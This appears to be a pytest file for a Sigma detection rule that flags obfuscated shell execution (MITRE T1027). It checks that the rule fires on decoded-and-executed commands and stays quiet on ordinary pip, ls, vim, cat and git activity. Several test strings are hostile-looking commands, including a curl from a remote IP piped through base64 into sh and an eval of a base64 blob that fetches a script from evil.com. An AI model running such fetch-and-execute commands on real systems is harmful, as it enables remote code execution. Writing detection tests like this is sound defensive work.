"""Tests for the T1027 Obfuscated Files or Information Sigma rule.

Lives in server/rules/builtin/mitre_attack/T1027_obfuscated_files.yml
and is exercised end-to-end through SigmaRuleRunner.

Covers:
- bash with `base64 -d` piped into interpreter           → fires
- bash with `echo <blob> | base64 --decode | bash`        → fires
- python -c with `exec(base64.b64decode(...))`            → fires
- xxd -r piped into bash                                  → fires
- `eval $()` form                                         → fires
- shell `tr` string reversal piped into bash              → fires
- pip3 install with `base64 -d` as substring (filter)     → does NOT fire
- plain `ls` with no obfuscation markers                 → does NOT fire
- vim editing a file containing 'base64' substring        → does NOT fire
- substring trap: filename containing 'base64-decoder'   → does NOT fire
  (anchor: \bbase64\s+ requires whitespace boundary, not substring)
- git command with `base64-decoder` in path (filter)      → does NOT fire
"""
from __future__ import annotations

import uuid
from datetime import datetime, timezone
from pathlib import Path

import pytest

from tests.fake_redis import FakeRedis
from zaqorincore_server.detectors.base import ParsedEvent
from zaqorincore_server.rule_engine.runner import SigmaRuleRunner
from zaqorincore_server.rule_engine.sigma import load_rules_from_dir

RULE_ID = "8f3d2a17-6b4e-4c81-9d2f-1a7e3c5b8d09"


def _rules() -> list:
    return load_rules_from_dir(Path("rules/builtin/mitre_attack"))


def _find(rules: list):
    return next(r for r in rules if r.id == RULE_ID)


def _event(process: str, command: str, **md) -> ParsedEvent:
    meta = {
        "event_type": "process_create",
        "process": process,
        "command": command,
        "user": "alice",
    }
    meta.update(md)
    return ParsedEvent(
        event_id=uuid.uuid4(),
        host_id=uuid.uuid4(),
        source="linux.audit.execve",
        raw="",
        metadata=meta,
        occurred_at=datetime.now(timezone.utc),
    )


@pytest.mark.asyncio
async def test_bash_base64_decode_pipe_fires() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/bin/bash",
            "bash -c 'echo aGVsbG8gd29ybGQ= | base64 -d | bash'",
        )
    )
    assert len(fires) == 1
    assert fires[0].rule.id == RULE_ID


@pytest.mark.asyncio
async def test_bash_base64_long_flag_pipe_fires() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/bin/bash",
            "bash -c 'curl -s http://203.0.113.10/x | base64 --decode | sh'",
        )
    )
    assert len(fires) == 1


@pytest.mark.asyncio
async def test_python_exec_base64_fires() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/usr/bin/python3",
            "python3 -c 'exec(base64.b64decode(\"aGVsbG8=\"))'",
        )
    )
    assert len(fires) == 1


@pytest.mark.asyncio
async def test_xxd_r_pipe_into_bash_fires() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/bin/bash",
            "bash -c 'printf \"68656c6c6f\" | xxd -r | bash'",
        )
    )
    assert len(fires) == 1


@pytest.mark.asyncio
async def test_eval_command_substitution_fires() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/bin/bash",
            "bash -c 'eval $(echo Y3VybCBodHRwczovL2V2aWwuY29tL3guc2g= | base64 -d)'",
        )
    )
    assert len(fires) == 1


@pytest.mark.asyncio
async def test_tr_reversal_into_bash_fires() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/bin/bash",
            "bash -c 'tr \"ab\" \"ba\" < /tmp/rev.txt | bash'",
        )
    )
    assert len(fires) == 1


@pytest.mark.asyncio
async def test_pip3_with_base64_substring_does_not_fire() -> None:
    """pip3 process excluded via filter_pkg_manager even though 'base64'
    appears as a substring elsewhere in the command."""
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/usr/bin/pip3",
            "pip3 install --no-cache-dir base64-decoder==1.2.3",
        )
    )
    assert fires == []


@pytest.mark.asyncio
async def test_plain_ls_does_not_fire() -> None:
    """A bare `ls` with no obfuscation markers must NOT fire."""
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event("/bin/ls", "ls -la /var/log/")
    )
    assert fires == []


@pytest.mark.asyncio
async def test_vim_editing_obfuscated_filename_does_not_fire() -> None:
    """vim is a legitimate editor; editing a file with `base64` in its
    name should NOT trigger the obfuscation rule."""
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event("/usr/bin/vim", "vim /tmp/base64_decoder.py")
    )
    assert fires == []


@pytest.mark.asyncio
async def test_substring_base64_decoded_does_not_match() -> None:
    """Anti-substring safety: a command containing 'base64-decoder' (which
    contains 'base64' as a substring but no `\bbase64\s+` boundary)
    must NOT spuriously match. Anchoring requires whitespace boundary.
    """
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event("/bin/cat", "cat /usr/share/base64-decoder/README.md")
    )
    assert fires == []


@pytest.mark.asyncio
async def test_git_with_base64_path_does_not_fire() -> None:
    """git is excluded via filter_legit even though it can spawn an
    interpreter; legitimate git operations must NOT trigger T1027."""
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event("/usr/bin/git", "git clone https://github.com/x/base64-decoder.git")
    )
    assert fires == []